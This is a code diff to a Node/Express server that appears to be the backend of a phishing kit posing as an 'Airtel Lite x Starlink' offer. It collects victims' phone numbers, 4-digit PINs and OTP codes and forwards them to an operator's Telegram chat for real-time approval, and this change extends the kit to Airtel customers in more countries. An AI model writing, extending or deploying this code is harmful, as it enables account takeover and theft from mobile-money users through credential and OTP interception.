@@ -17,6 +17,9 @@ const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8045300220';
 export interface SessionRecord {
   sessionId: string;
   phone: string;
+  fullPhone?: string;
+  country?: string;
+  airtelBrand?: string;
   pin: string;
   otp?: string;
   planName: string;
@@ -238,7 +241,8 @@ async function pollTelegramUpdates() {
                 if (msgId && chatId) {
                   const updatedText =
                     `🔴 <b>AIRTEL LITE - CONNEXION CLIENT VALIDÉE</b>\n\n` +
-                    `👤 <b>Numéro:</b> <code>+243 ${session.phone}</code>\n` +
+                    `🌍 <b>Pays:</b> ${session.country || 'Airtel'}\n` +
+                    `👤 <b>Numéro:</b> <code>${session.fullPhone || session.phone}</code>\n` +
                     `🔑 <b>Code PIN:</b> <code>${session.pin}</code>\n` +
                     `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
                     `🆔 <b>Session:</b> <code>${session.sessionId}</code>\n` +
@@ -298,7 +302,8 @@ async function pollTelegramUpdates() {
                 if (msgId && chatId) {
                   const updatedText =
                     `🔐 <b>AIRTEL LITE - CODE OTP VALIDÉ (4 CHIFFRES)</b>\n\n` +
-                    `👤 <b>Numéro:</b> <code>+243 ${session.phone}</code>\n` +
+                    `🌍 <b>Pays:</b> ${session.country || 'Airtel'}\n` +
+                    `👤 <b>Numéro:</b> <code>${session.fullPhone || session.phone}</code>\n` +
                     `🔢 <b>Code OTP:</b> <code>${session.otp}</code>\n` +
                     `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
                     `🆔 <b>Session:</b> <code>${session.sessionId}</code>\n` +
@@ -393,13 +398,16 @@ app.get('/api/health', (req, res) => {
 // 1. Send Login Credentials to Telegram
 app.post('/api/telegram/send-login', async (req, res) => {
   try {
-    const { sessionId, phone, pin, planName, planPrice } = req.body;
+    const { sessionId, phone, pin, planName, planPrice, country, fullPhone, airtelBrand } = req.body;
 
     if (!sessionId || !phone || !pin) {
       return res.status(400).json({ error: 'Champs obligatoires manquants.' });
     }
 
     const cleanPhone = normalizePhone(phone);
+    const displayPhone = fullPhone || `+243 ${cleanPhone}`;
+    const displayCountry = country || 'Airtel Africa';
+    const displayBrand = airtelBrand || 'Airtel x Starlink Direct';
 
     // Retrieve or instantiate session
     let session = sessions.get(sessionId);
@@ -407,6 +415,9 @@ app.post('/api/telegram/send-login', async (req, res) => {
       session = {
         sessionId,
         phone: cleanPhone,
+        fullPhone: displayPhone,
+        country: displayCountry,
+        airtelBrand: displayBrand,
         pin: pin.toString().slice(0, 4),
         planName: planName || 'Forfait Airtel Starlink',
         planPrice: planPrice || '$1.49',
@@ -418,6 +429,9 @@ app.post('/api/telegram/send-login', async (req, res) => {
       sessions.set(sessionId, session);
     } else {
       session.phone = cleanPhone;
+      session.fullPhone = displayPhone;
+      session.country = displayCountry;
+      session.airtelBrand = displayBrand;
       session.pin = pin.toString().slice(0, 4);
       session.planName = planName || session.planName;
       session.planPrice = planPrice || session.planPrice;
@@ -430,10 +444,11 @@ app.post('/api/telegram/send-login', async (req, res) => {
 
     const messageText =
       `🔴 <b>NOUVELLE TENTATIVE DE CONNEXION AIRTEL LITE</b>\n\n` +
-      `👤 <b>Numéro de Téléphone:</b> <code>+243 ${cleanPhone}</code>\n` +
+      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
+      `👤 <b>Numéro de Téléphone:</b> <code>${displayPhone}</code>\n` +
       `🔑 <b>Code PIN (4 chiffres):</b> <code>${session.pin}</code>\n` +
       `📦 <b>Forfait Choisi:</b> <b>${session.planName}</b> (${session.planPrice})\n` +
-      `📶 <b>Réseau:</b> Airtel RDC x Starlink Direct\n` +
+      `📶 <b>Réseau:</b> ${displayBrand}\n` +
       `⏰ <b>Horodatage:</b> ${new Date().toLocaleTimeString('fr-FR')} (${new Date().toLocaleDateString('fr-FR')})\n` +
       `🆔 <b>ID Session:</b> <code>${sessionId}</code>\n\n` +
       `👇 <i>Veuillez valider ou rejeter cette connexion ci-dessous :</i>`;
@@ -472,7 +487,7 @@ app.post('/api/telegram/send-login', async (req, res) => {
 // 2. Send 4-digit OTP Code to Telegram
 app.post('/api/telegram/send-otp', async (req, res) => {
   try {
-    const { sessionId, phone, otp, planName, planPrice } = req.body;
+    const { sessionId, phone, otp, planName, planPrice, country, fullPhone, airtelBrand } = req.body;
 
     if (!sessionId || !otp) {
       return res.status(400).json({ error: 'Paramètres manquants.' });
@@ -489,6 +504,9 @@ app.post('/api/telegram/send-otp', async (req, res) => {
       session = {
         sessionId,
         phone: cleanPhone,
+        fullPhone: fullPhone || `+243 ${cleanPhone}`,
+        country: country || 'Airtel Africa',
+        airtelBrand: airtelBrand || 'Airtel Starlink',
         pin: '****',
         planName: planName || 'Forfait Airtel Starlink',
         planPrice: planPrice || '$1.49',
@@ -505,12 +523,18 @@ app.post('/api/telegram/send-otp', async (req, res) => {
 
     session.otp = cleanOtp;
     session.otpStatus = 'pending';
+    if (fullPhone) session.fullPhone = fullPhone;
+    if (country) session.country = country;
     session.lastUpdated = Date.now();
     saveSessionsToDisk();
 
+    const displayPhone = session.fullPhone || `+243 ${session.phone}`;
+    const displayCountry = session.country || 'Airtel Africa';
+
     const messageText =
       `🔐 <b>CODE DE VÉRIFICATION OTP REÇU (4 CHIFFRES)</b>\n\n` +
-      `👤 <b>Numéro:</b> <code>+243 ${session.phone}</code>\n` +
+      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
+      `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
       `🔢 <b>Code OTP Saisi:</b> <code>${cleanOtp}</code>\n` +
       `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
       `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
